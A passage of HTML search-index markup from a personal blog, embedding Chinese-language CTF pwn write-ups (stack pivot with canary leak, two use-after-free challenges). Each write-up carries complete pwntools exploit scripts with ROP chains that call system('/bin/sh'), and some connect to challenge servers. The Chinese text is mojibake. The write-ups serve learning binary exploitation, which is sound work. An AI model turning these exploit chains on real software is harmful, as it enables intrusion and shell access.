# ============================================================
# 0x0000000000401214 : leave ; ret
# 0x000000000040127c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401280 : pop r14 ; pop r15 ; ret
# 0x0000000000401282 : pop r15 ; ret
# 0x000000000040127b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040127f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040115d : pop rbp ; ret
# 0x0000000000401283 : pop rdi ; ret
# 0x0000000000401281 : pop rsi ; pop r15 ; ret
# 0x000000000040127d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 12
&lt;/code&gt;&lt;/pre&gt;
">Âè™Êúâ‰∏ÄÊ¨°Ê∫¢Âá∫ÁöÑÊ†àËøÅÁßªÁªÉ‰π†</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/oDp60mSoN/"" data-c="
          &lt;p&gt;Âèà‰∏ÄÈÅìÊ†àËøÅÁßªÔºå64‰ΩçÂºÄÂêØcanaryÂíånx‰øùÊä§Ôºå&lt;br&gt;
idaÊü•ÁúãÂÖ±Êúâ‰∏§Ê¨°ËæìÂÖ•ÔºåÈÉΩÈúÄË¶ÅÈ™åËØÅcanary&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940554319.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678940558887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËÄåÁ¨¨‰∫åÊ¨°Ê∫¢Âá∫ÈïøÂ∫¶‰∏çÂ§üÔºåËÄÉËôëÊ†àËøÅÁßª&lt;br&gt;
‰∫éÊòØÁ¨¨‰∏ÄÊ¨°Ê∫¢Âá∫Ê≥ÑÈú≤canaryÔºåÁ¨¨‰∫åÊ¨°ËøõË°åÊ†àËøÅÁßªÔºåÂÜçÂà∞ËøÅÁßªÂà∞ÁöÑbssÊÆµ‰∏äËøõË°åÂ∏ÉÊ†àÊìç‰ΩúÊ≥ÑÈú≤libcÔºåÊúÄÂêéÂÜç&lt;s&gt;ËøîÂõû‰∏ªÂáΩÊï∞‰ΩøÁî®one_gadget&lt;/s&gt;&lt;br&gt;
Ê≥ÑÈú≤canary‰πãÂêéÁöÑÁ¨¨‰∏ÄÊÆµpayloadÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text) #read_text‰∏∫Á¨¨‰∫åÊ¨°read 
io.send(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âà©Áî®‰∏ÄÊ¨°leaveÊéßÂà∂rbpÂØÑÂ≠òÂô®Âà∞bss_addrÂ§ÑÔºåÂÜçËøõË°åreadÔºå‰ªéË∑ùÁ¶ªrbp-0x110Â§ÑÂºÄÂßãÂ∏ÉÊ†àÔºåÊ≥®ÊÑèÂ∞Ürbp(‰πüÂ∞±ÊòØbss_addrÂ§ÑÔºâË¶ÜÁõñ‰∏∫bss_addr-0x110ÔºåÂ∞Ürbp+0x8Ôºà‰πüÂ∞±ÊòØbss_addr+0x8)Â§ÑË¶ÜÁõñ‰∏∫leave_retÔºåÂÆåÊàêÂêéÁ¨¨‰∫åÊ¨°leaveÂä´ÊåÅrspÂà∞bss_addr+0x8Â§ÑÔºåÂêåÊó∂Â∞ÜrbpÊåáÂêëbss_addr-0x110Â§ÑÔºåÁÑ∂ÂêéÁ¨¨‰∏âÊ¨°leave_retÂÖàÂä´ÊåÅrspÂà∞bss_addr-0x110Â§ÑÔºåÁÑ∂Âêépop rbpÂØºËá¥rsp+0x8ÔºåÊúÄÂêéretÊâßË°åÂêéÁª≠Êåá‰ª§Ôºå‰∫éÊòØÂà©Áî®Á¨¨‰∫åÊÆµpayloadÊ≥ÑÈú≤libcÔºåÊ≥®ÊÑèÊ†àÁ©∫Èó¥ËÆ°ÁÆóÔºåËøôÈáå‰ΩøÁî®‰∫ÜljustÂ∑¶ÂØπÈΩêÔºå‰πãÂâçÊâãÁÆóÁöÑÂÅèÁßªÂØºËá¥canaryÈ™åËØÅÂá∫Èîôüò∂‚Äçüå´Ô∏è&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âè¶Â§ñÊ≥®ÊÑèÊúÄÂêéËøîÂõûÁöÑÊòØvulnÂáΩÊï∞‰∏çÊòØmainÂáΩÊï∞Ôºå‰∏ÄÂºÄÂßãËøîÂõûmainÁî®gdbÊ≠•ËøõÂà∞printfÂá∫ÈóÆÈ¢òÔºåÔºàmainÂáΩÊï∞‰∏≠setbufÂêéÁºìÂÜ≤Âå∫ËÆæ0ÔºåÂØºËá¥printfÊó∂‰ºöÊúâ‰∏Ä‰∏™Âú®Ê†à‰∏äÂàõÂª∫‰∏ÄÂù®Áõ∏ÂÖ≥Êï∞ÊçÆÁªìÊûÑÁöÑÊìç‰ΩúÔºåÂ∞±ÁÆóÊ≠£Â∏∏Ë∑ë‰πüË¶ÅÂêÉÊéâÂ§ßÈáèÊ†àÔºåÊâÄ‰ª•‰ºöË∑ëÁùÄË∑ëÁùÄÊ†à‰∏çÂ§ü‰∫ÜÔºåÂÜôÂà∞‰∏çËØ•ÂÜôÁöÑÂú∞Êñπ‰∫Ü„ÄÇÔºâ--Â≠¶ÈïøÂéüËØùÊëòÊäÑ&lt;br&gt;
ÊúÄÂêéÊ≠§È¢òone_gadgetÂè™Êúâ‰∏Ä‰∏™ËÉΩÂú®Êú¨Âú∞Ë∞ÉËØïÊ®°Âºè‰∏ãÊâìÈÄöÔºåËøúÁ´ØÈÄö‰∏ç‰∫ÜÔºõ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678942093537.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ËøòÊòØÊîæ‰∏ã‰∏çÂÆåÊï¥ÁöÑexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pivot&amp;quot;)
# io=remote(&amp;quot;43.143.7.127&amp;quot;,28559)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x500
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

gdb.attach(io)
pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.sendline(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

# sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
# str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[0]+base_addr
print(&amp;quot;shell:  &amp;quot;+hex(shell))
payload=cyclic(0x107)+p64(canary)+p64(0)+p64(shell)
io.send(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;+++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;br&gt;
Êõ¥Êñ∞:&lt;br&gt;
Êú¨È¢ò‰∏çÁî®one_gadgetÂ∞±Âú®ÊúÄÂêé‰∏ÄÊ¨°Ê∫¢Âá∫Â§ÑÂÜçËøÅÁßª‰∏ÄÊ¨°Ê†àÂà©Áî®ÊûÑÈÄ†‰πüË°å,Ê≥®ÊÑègdbË∞ÉËØïÂÅèÁßªÈáè,&lt;s&gt;Êàë‰∏ç‰ºöÁÆóÂè™Êúâ‰∏ÄÊ¨°Ê¨°ËØï&lt;/s&gt;&lt;br&gt;
Êõ¥Êñ∞ÂêéexpÂèØÈÄöËøúÁ´Ø:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pivot&amp;quot;)
io=remote(&amp;quot;43.143.7.127&amp;quot;,28442)
elf=ELF(&amp;quot;./pivot&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
one_gadget=[0x50a37,0xebcf1,0xebcf5,0xebcf8,0xebd52,0xebdaf,0xebdb3]
pop_rdi_ret=0x401343
bss_addr=0x404080+0x900 #ÂÅèÁßªÂç°‰∫ÜÊàë3Â§©,xÂ≠¶ÈïøÊåáÁÇπÈÄö‰∫Ü
leave_ret=0x401213
read_text=0x4011D4
vuln=0x4011b6

io.recvuntil(b&amp;quot;Name:\n&amp;quot;)
payload=b&amp;quot;a&amp;quot;*0x28

# gdb.attach(io)
# pause()

io.sendline(payload)
io.recvuntil(b&amp;quot;a\n&amp;quot;)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary:  &amp;quot;+hex(canary))

payload=cyclic(0x108)+p64(canary)+p64(bss_addr)+p64(read_text)
io.send(payload)

io.recvuntil(b&amp;quot;\n&amp;quot;)
payload=p64(0)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(vuln)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x110)+p64(leave_ret)
io.send(payload)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
io.recvuntil(b&amp;quot;BYE.\n&amp;quot;)
base_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;base_addr:  &amp;quot;+hex(base_addr))

sys_addr=base_addr+libc.sym[b&amp;quot;system&amp;quot;]
str_bin_sh=base_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

shell=one_gadget[1]+base_addr
print(&amp;quot;sys_addr:  &amp;quot;+hex(sys_addr))
print(&amp;quot;str_bin_sh:  &amp;quot;+hex(str_bin_sh))

payload=p64(pop_rdi_ret)+p64(str_bin_sh)+p64(sys_addr)
payload=payload.ljust(0x108,b&amp;quot;a&amp;quot;)+p64(canary)+p64(bss_addr-0x208)+p64(leave_ret)  #0x208ÂÅèÁßª‰ªé0x220ÂºÄÂßãÊâãË∞Éüòéüëìü•π
io.sendline(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x0000000000401213 : leave ; ret
# 0x0000000000401196 : mov byte ptr [rip + 0x2eeb], 1 ; pop rbp ; ret
# 0x00000000004012d3 : mov ecx, 0xc9fffffd ; ret
# 0x000000000040133c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401340 : pop r14 ; pop r15 ; ret
# 0x0000000000401342 : pop r15 ; ret
# 0x000000000040133b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040133f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040119d : pop rbp ; ret
# 0x0000000000401343 : pop rdi ; ret
# 0x0000000000401341 : pop rsi ; pop r15 ; ret
# 0x000000000040133d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret

# Unique gadgets found: 14
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]pivot wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/RpGkEvpwv/"" data-c="
          &lt;p&gt;ËøôÈÅìÈ¢òËÄÉÂØüUAFÂíåÁ≥ªÁªüË∞ÉÁî®ÔºåÊúÄÂêéÊãøshellËÄóË¥πÊó∂Èó¥ÊØîÊûÑÈÄ†UAFÊó∂Èó¥ÈïøÔºõ&lt;br&gt;
Â≠òÂú®system()ÂáΩÊï∞Ôºå‰ΩÜÈúÄË¶ÅËá™Â∑±‰º†ÂèÇ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522527943.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Êú¨È¢òÂ≠òÂú®4‰∏™ÂáΩÊï∞ÔºåÂÖ∂‰∏≠createÂáΩÊï∞ÊØèÊ¨°ÂºÄËæü‰∏Ä‰∏™‰∏ãÊ†áÈÄíÂ¢ûÁöÑpageÔºåeditÂáΩÊï∞ÂèØ‰ª•‰øÆÊîπÊåáÂÆöpageÔºådelÂáΩÊï∞Âà†Èô§ÊåáÂÆöpageÔºå‰ΩÜfreeÂêéÊ≤°ÊúâÂ∞ÜÊåáÈíàÁΩÆNULLÔºåÂ≠òÂú®UAFÔºõ&lt;br&gt;
ËÄåshowÂáΩÊï∞ÂàôÊòØÊú¨È¢òÂÖ≥ÈîÆ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678522658853.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂΩìËæìÂÖ•‰∏∫Èùû0Êó∂ÔºåÂ±ïÁ§∫ËæìÂÖ•ÊåáÂêëÁöÑpageÔºåËÄåÂΩìËæìÂÖ•‰∏∫0Êó∂ÔºåÂàôÊâßË°åpage0Â§ÑÊåá‰ª§&lt;br&gt;
ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÂÖàcreate 1Ê¨°ÁîüÊàêpage0ÔºådelÂêéÂÜçcreate 1Ê¨°ÁîüÊàêpage1Ôºå‰ΩÜÊ≠§Êó∂page1‰ΩøÁî®ÁöÑ‰ªçÁÑ∂Êó∂page0ÁöÑÂ†ÜÁ©∫Èó¥ÔºåÊâÄ‰ª•edit page1Êó∂Á≠âÊïà‰∫éedit page0ÔºåÊúÄÂêéshow(0)Âç≥ÂèØÔºõ&lt;br&gt;
‰∏çËøáÊúÄÂêéÊãøshellÁöÑË∑ØÁ®ãËøòÁúüÊòØÁªïÔºåÊ≠§È¢òÂ≠òÂú®&lt;code&gt;NICO&lt;/code&gt;ÂáΩÊï∞ÂèØ‰ª•Ë∞ÉÁî®&lt;code&gt;system(command)&lt;/code&gt;Ôºå&lt;br&gt;
gdbË∞ÉËØïÂèëÁé∞ÊúÄÂêéË∞ÉÁî®systemÊòØÈÄöËøácall eaxË∞ÉÁî®ÁöÑ&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-asm&#34;&gt;0x8048984 &amp;lt;show+60&amp;gt;    mov    eax, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048989 &amp;lt;show+65&amp;gt;    mov    eax, dword ptr [eax + 4]
0x804898c &amp;lt;show+68&amp;gt;    mov    edx, dword ptr [page]         &amp;lt;0x804a060&amp;gt;
0x8048992 &amp;lt;show+74&amp;gt;    sub    esp, 0xc
0x8048995 &amp;lt;show+77&amp;gt;    push   edx
0x8048996 &amp;lt;show+78&amp;gt;    call   eax
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;‰ΩÜÊòØeaxÁöÑÂÄºÊúÄÂêéÊåáÂêë[page+0x4]Â§ÑÔºåÊÑèÂë≥ÁùÄÊúÄÂêépayloadÊûÑÈÄ†ÈúÄË¶ÅÂú®system_addrÂâçÂä†‰∏ä0x4ÁöÑÂÅèÁßª&lt;br&gt;
Â¶Ç‰∏ãÂõæÔºåËøôÊòØ‰∏çÂä†ÂÅèÁßªÁöÑÁªìÊûúÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523497501.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•ÊûÑÈÄ†ÂàùÊ≠•ÁöÑpayloadÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=cyclic(0x4)+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Âä†‰∏äÂÅèÁßªÂêéËøòÈúÄËÄÉËôëÁ≥ªÁªüË∞ÉÁî®‰º†ÂèÇÁöÑÈóÆÈ¢òÔºåÊú¨È¢ò‰∏çËÉΩÁõ¥Êé•Âä†‰∏äÂÅèÁßªÂ∞±ÂÆå‰∫ã‰∫ÜÔºåÂê¶ÂàôÂèà‰ºöÂ¶Ç‰∏ãÂõæÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678523557372.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•ÁúãÂá∫0x4ÁöÑÂÅèÁßª‰Ωú‰∏∫command‰º†ËøõsystemÔºåÊâÄ‰ª•ÈúÄË¶Å‰øÆÊîπpayload‰∏∫Ôºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊâÄ‰ª•ÊúÄÂêéexpÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;x86&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./[NISACTF 2022]UAF&amp;quot;)
# io=remote(&amp;quot;1.14.71.254&amp;quot;,28767)
NICO_addr=0x8048642

def create():
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;1&amp;quot;)

def edit(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;2&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))
    io.recvuntil(b&amp;quot;strings\n&amp;quot;)

def dele(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;3&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

def show(num):
    io.recvuntil(b&amp;quot;:&amp;quot;)
    io.sendline(b&amp;quot;4&amp;quot;)
    io.recvuntil(b&amp;quot;page\n&amp;quot;)
    io.sendline(str(num))

create()
dele(0)
create()
edit(1)

gdb.attach(io)
pause()

payload=b&amp;quot;sh\x00\x00&amp;quot;+p32(NICO_addr)
io.sendline(payload)
show(0)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[NISACTF 2022]UAF wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/10qStEKI_/"" data-c="
          &lt;p&gt;Ê≠§È¢òËÄÉÂØüËôöÂáΩÊï∞ÂÜÖÂ≠òÂàÜÈÖç‰ª•Âèäuaf(use after free)&lt;br&gt;
Êú¨È¢òÁªôÂá∫.cppÊñá‰ª∂&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;iostream&amp;gt; 
#include &amp;lt;cstring&amp;gt;
#include &amp;lt;cstdlib&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system(&amp;quot;/bin/sh&amp;quot;);
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout &amp;lt;&amp;lt; &amp;quot;My name is &amp;quot; &amp;lt;&amp;lt; name &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; &amp;quot;I am &amp;quot; &amp;lt;&amp;lt; age &amp;lt;&amp;lt; &amp;quot; years old&amp;quot; &amp;lt;&amp;lt; endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this-&amp;gt;name = name;
		this-&amp;gt;age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a nice guy!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this-&amp;gt;name = name;
                this-&amp;gt;age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout &amp;lt;&amp;lt; &amp;quot;I am a cute girl!&amp;quot; &amp;lt;&amp;lt; endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man(&amp;quot;Jack&amp;quot;, 25);
	Human* w = new Woman(&amp;quot;Jill&amp;quot;, 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout &amp;lt;&amp;lt; &amp;quot;1. use\n2. after\n3. free\n&amp;quot;;
		cin &amp;gt;&amp;gt; op;

		switch(op){
			case 1:
				m-&amp;gt;introduce();
				w-&amp;gt;introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout &amp;lt;&amp;lt; &amp;quot;your data is allocated&amp;quot; &amp;lt;&amp;lt; endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê∫ê‰ª£Á†Å‰∏≠ &lt;strong&gt;case3:&lt;/strong&gt; ÈáåÈù¢freeÊéâ‰∫ÜmÂíåwÂêéÂπ∂Êú™Â∞ÜÊåáÈíàÊåáÂêëNULLÔºåÂ≠òÂú®ÊÇ¨ÂûÇÊåáÈíàÔºåÂèØ‰ª•ÊúâuafÔºõ&lt;br&gt;
uafÂç≥use after freeÔºåÂú®ÊÇ¨ÂûÇÊåáÈíàÂêéÔºåÂÜçÊ¨°ÈáçÊñ∞ÂàÜÈÖçÂÜÖÂ≠òÔºåÂèØ‰ª•ÈÄöËøáÂêÑÁßçÊñπÂºèÊîπÂÜôÊÇ¨ÂûÇÊåáÈíàÊåáÂêëÁöÑÂÜÖÂ≠òÁ©∫Èó¥Âú∞ÂùÄÔºåÂÜçÊ¨°Ë∞ÉÁî®ËØ•ÊåáÈíàÊó∂ÔºåÂ∞ÜÂèØËÉΩÈÄ†Êàê‰∏•ÈáçÂêéÊûú&lt;br&gt;
ËÄå&lt;code&gt;Man&lt;/code&gt;Âíå&lt;code&gt;Woman&lt;/code&gt;ÊòØ&lt;code&gt;Human&lt;/code&gt;ÁöÑÂ≠êÁ±ªÔºåËôöË°®‰∏≠Â≠òÂú®Áà∂Á±ªÁöÑÁßÅÊúâËôöÂáΩÊï∞&lt;code&gt;give_shell()&lt;/code&gt;ÁöÑÂú∞ÂùÄÔºå‰ΩÜÂπ∂Ê≤°ÊúâÁõ¥Êé•ÁªßÊâø&lt;code&gt;Human&lt;/code&gt;ÁöÑÁßÅÊúâËôöÂáΩÊï∞&lt;code&gt;give_shell()&lt;/code&gt;Ôºö&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678375061028.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;‰∫éÊòØÊàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂÖàÊâæÂà∞ËôöË°®‰∏≠&#39;give_shell()&#39;ÁöÑÂú∞ÂùÄÔºàgdbË∞ÉËØïËøáÁ®ã‰∏≠‰ºöÂá∫Áé∞&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1678376245302.png&#34; alt=&#34;0x401550&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;Ë∞ÉÁî® &lt;strong&gt;case3:&lt;/strong&gt; Âêé‰ΩøÊåáÈíàÊÇ¨ÂûÇ&lt;br&gt;
ÁÑ∂ÂêéÈÄöËøá &lt;strong&gt;case2:&lt;/strong&gt; ÈáçÊñ∞ÂàÜÈÖçÂÜÖÂ≠òÔºå‰πãÂêéÂÜçË∞ÉÁî® &lt;strong&gt;case1:&lt;/strong&gt;&lt;br&gt;
&lt;strong&gt;case2:&lt;/strong&gt; Ë∞ÉÁî®‰∏≠argv[2]ÊòØ‰ªéÊñá‰ª∂ËØªÂÖ•ÔºåËØªÂÖ•ÈïøÂ∫¶Ë∑ü‰πãÂâçÂÆö‰πâ&lt;code&gt;Human *m; Human *w&lt;/code&gt;Êó∂ÂàÜÈÖçÁöÑÂÜÖÂ≠òÂ§ßÂ∞èÁõ∏Âêå‰∏∫0x18ÔºåÁ°Æ‰øùÂêéÁª≠‰øÆÊîπÂÜÖÂ≠òÂå∫ÂüüÂêàÈÄÇ&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376620004.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂèØ‰ª•Âú®Ê≠§Â§ÑÂä´ÊåÅ&lt;code&gt;introduce()&lt;/code&gt;‰∏∫&lt;code&gt;give_shell()&lt;/code&gt;,‰ΩÜÊòØË∞ÉÁî®&#39;introduce()&#39;Êó∂Ë∞ÉÁî®ÁöÑÊòØËôöÂáΩÊï∞ÊåáÈíà+0x8Â§ÑÁöÑÔºåÊâÄ‰ª•ÈúÄË¶ÅÂ∞ÜÂú∞ÂùÄ-0x8Ôºå&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678376899366.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
‰ΩøÁî®&lt;code&gt;python -c &amp;quot;print(&#39;\x68\x15\x40\x00\x00\x00\x00\x00&#39;)&amp;quot; &amp;gt;~/ÊñáÊ°£/pwnable/uaf.txt&lt;/code&gt;ÊâìÂç∞‰∏çÂèØËßÅÂ≠óÁ¨¶Âà∞Êñá‰ª∂&lt;br&gt;
‰πãÂêéÂÜç‰ΩøÁî®&lt;code&gt;./uaf 24 ~/ÊñáÊ°£/pwnable/uaf.txt&lt;/code&gt;‰ªéÊñá‰ª∂ËØªÂÖ•24‰∏™Â≠óËäÇÂÜÖÂÆπ&lt;br&gt;
Ê≥®ÊÑè &lt;strong&gt;case2:&lt;/strong&gt; ÈúÄË¶ÅË∞ÉÁî®‰∏§Ê¨°ÔºåÂéüÂõ†ÊòØ &lt;strong&gt;case1:&lt;/strong&gt; ÊúÄÂºÄÂßãË∞ÉÁî®mÔºåËÄå &lt;strong&gt;case3:&lt;/strong&gt; ÊúÄÂêéfreeÁöÑÊó∂wÔºåÈúÄÈáçÊñ∞ÂàÜÈÖç‰∏§Ê¨°ÂÜÖÂ≠òÔºõ&lt;br&gt;
ÊúÄÂêéÂèØ‰ª•getshellÔºåpwnable.kr ÁöÑ/tmpÁõÆÂΩïÂèØÂÜô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1678378104148.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">pwnable.kr uaf wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/hIUbdZ-jy/"" data-c="
